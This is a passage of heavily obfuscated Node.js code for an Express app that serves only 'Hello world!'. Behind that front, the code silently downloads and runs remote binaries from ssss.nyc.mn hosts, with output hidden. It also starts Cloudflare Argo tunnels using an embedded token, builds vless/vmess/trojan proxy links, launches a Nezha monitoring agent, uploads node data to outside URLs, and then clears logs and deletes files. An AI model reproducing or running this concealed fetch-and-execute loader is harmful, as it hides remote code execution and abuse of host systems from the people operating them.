NEZHA_SERVER&&NEZHA_KEY&&_0x5d40e8[_0x59f2c6(_0x4a7604._0x4cb8bb)](phpPath);process[_0x59f2c6(0xf2)]===_0x59f2c6(0x120)?exec(_0x59f2c6(_0x4a7604._0x578a17)+_0x5d40e8[_0x59f2c6(0xd1)]('\x20')+_0x59f2c6(_0x4a7604._0x4d4ace),_0x5b9a32=>{const _0x51318b=_0x59f2c6;console['clear'](),console[_0x51318b(_0xffd0e9._0x40c31b)](_0x51318b(_0xffd0e9._0x2f773b)),console[_0x51318b(0xba)](_0x51318b(0xd2));}):exec(_0x59f2c6(_0x4a7604._0x3ed10d)+_0x5d40e8[_0x59f2c6(0xd1)]('\x20')+_0x59f2c6(0xf4),_0x227c87=>{const _0x43c8ca=_0x59f2c6;console[_0x43c8ca(_0x314405._0x40d798)](),console[_0x43c8ca(0xba)](_0x43c8ca(_0x314405._0x569beb)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}function _0x58b4(){const _0x4de04b=['\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','stream','writeFileSync','\x22\x20>\x20/dev/null\x202>&1','vmess','close','express','tcp','org','basename','npm\x20running\x20error:\x20','pkill\x20-f\x20\x22[','response','abcdefghijklmnopqrstuvwxyz','length','Error\x20downloading\x20files:','8443','NEZHA_PORT','\x20is\x20created','mkdirSync','then','pop','Content-Type','14zTTMpu','/config.json\x20>/dev/null\x202>&1\x20&','Unhandled\x20error\x20in\x20startserver:','test','readdirSync','path','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','2096','http','exec','270520PsLbtS','axios','App\x20is\x20running','arm','\x20successfully','TunnelSecret','https://arm64.ssss.nyc.mn/agent','north.sinwonderful.eu.org','tls','FILE_PATH','Download\x20','\x0a\x20\x20\x20\x20','691432HVFvcm','/api/delete-nodes','data','log','ARGO_DOMAIN','list.txt','fileUrl','floor','119IMvqGz','ARGO_DOMAIN:','child_process','https://ipapi.co/json/','\x0avless://','send','readFileSync','pipe','Error\x20in\x20startserver:','443','http\x20server\x20is\x20running\x20on\x20port:','?security=tls&sni=','quic','none','https://amd64.ssss.nyc.mn/v1','485298sJJNCc','SERVER_PORT','/trojan-argo','join','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','freedom','unlinkSync','10jXEwAj','base64','toString','post','stringify','/api/add-subscriptions','/tunnel.yml\x20run','tunnel.yml','catch','application/json','rm\x20-rf\x20','https://arm64.ssss.nyc.mn/bot','sub','.exe\x20>\x20nul\x202>&1','&fp=firefox&type=ws&host=','del\x20/f\x20/q\x20','2257453fZEGts','\x20>/dev/null\x202>&1\x20&','ARGO_AUTH','--tls','2087','charAt','eyJhIjoiYjFjYTI1ZWQyZGI3MDg5YjU1YmI3ODU3NjBhODM5MDUiLCJ0IjoiNWM5YjViNGEtOTMyMS00YjA5LTgwYTItZmUxYWRmNTBkODUzIiwicyI6Ik5tVmtaRGd5TWpVdE1qYzRNeTAwWlRGbUxXRmhPVFV0T0RCbU5qRXpOV1ZrTXpObSJ9','Add\x20automatic\x20access\x20task\x20faild:\x20','amd','clear','NEZHA_SERVER','/vmess-argo?ed=2560','forEach','platform','/sub.txt\x20saved\x20successfully','\x20>/dev/null\x202>&1','match','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','\x20-c\x20\x22','random','status','config.json','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','Skipping\x20adding\x20automatic\x20access\x20task','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','north','https+local://8.8.8.8/dns-query','error','success','true','UPLOAD_URL','\x0aclient_secret:\x20','boot.log','env','https://amd64.ssss.nyc.mn/web','\x20-c\x20','Hello\x20world!','message','Nodes\x20uploaded\x20successfully','3048nMrbyT','127.0.0.1','utf-8','/vless-argo','UUID','https://amd64.ssss.nyc.mn/bot','\x0a\x0atrojan://','listen','from','set','nohup\x20','country_code','Error\x20executing\x20command:\x20','2083','config.yaml','false','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','\x20failed:\x20','fileName','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','win32','taskkill\x20/f\x20/im\x20','PROJECT_URL','text/plain;\x20charset=utf-8','aarch64','filter','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','xtls-rprx-vision','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x20-s\x20','direct','SUB_PATH','f42eb3a9-1cc9-41e7-8a26-6c77f40f3f24','NEZHA\x20variable\x20is\x20empty,skip\x20running','unshift','map','148996TCxJKZ','&path=%2Ftrojan-argo%3Fed%3D2560#','/dev/null','block','2053','existsSync','vless','\x20>\x20nul\x202>&1','https://oooo.serv00.net/add-url','php\x20running\x20error:\x20','push','3930GUIpUE','PORT','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x20is\x20running','3663621AJDbeH','\x0a\x20\x20tunnel:\x20','https://amd64.ssss.nyc.mn/agent','split','cdns.doon.eu.org','statSync','firefox','tunnel.json','includes','/vmess-argo','get','Error\x20reading\x20boot.log:','https://arm64.ssss.nyc.mn/web','has','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','?encryption=none&security=tls&sni=','CFIP','blackhole','countryCode','Unknown'];_0x58b4=function(){return _0x4de04b;};return _0x58b4();}cleanFiles();async function AddVisitTask(){const _0x36cfc1={_0x6f90c1:0xfc,_0x475621:0xd8,_0x555d46:0x6f,_0xeb3cdf:0xba,_0xb6c5c6:0xec},_0x5e39b3=_0x2d90f3;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x5e39b3(_0x36cfc1._0x6f90c1));return;}try{const _0x5524b9=await axios[_0x5e39b3(_0x36cfc1._0x475621)](_0x5e39b3(_0x36cfc1._0x555d46),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x5e39b3(0xde)}});return console[_0x5e39b3(_0x36cfc1._0xeb3cdf)]('automatic\x20access\x20task\x20added\x20successfully'),_0x5524b9;}catch(_0x513a35){return console[_0x5e39b3(0x100)](_0x5e39b3(_0x36cfc1._0xb6c5c6)+_0x513a35['message']),null;}}async function startserver(){const _0x5f2502={_0x46b7e4:0x100,_0x2dbc23:0xc7},_0x594b3a=_0x2d90f3;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0xd59726){console[_0x594b3a(_0x5f2502._0x46b7e4)](_0x594b3a(_0x5f2502._0x2dbc23),_0xd59726);}}startserver()[_0x2d90f3(0xdd)](_0x3cbea7=>{const _0x396e87={_0x3ada8d:0x100,_0x4f716b:0xa3},_0x6e2cf4=_0x2d90f3;console[_0x6e2cf4(_0x396e87._0x3ada8d)](_0x6e2cf4(_0x396e87._0x4f716b),_0x3cbea7);}),app[_0x2d90f3(0x113)](PORT,()=>console['log'](_0x2d90f3(0xc9)+PORT+'!'));
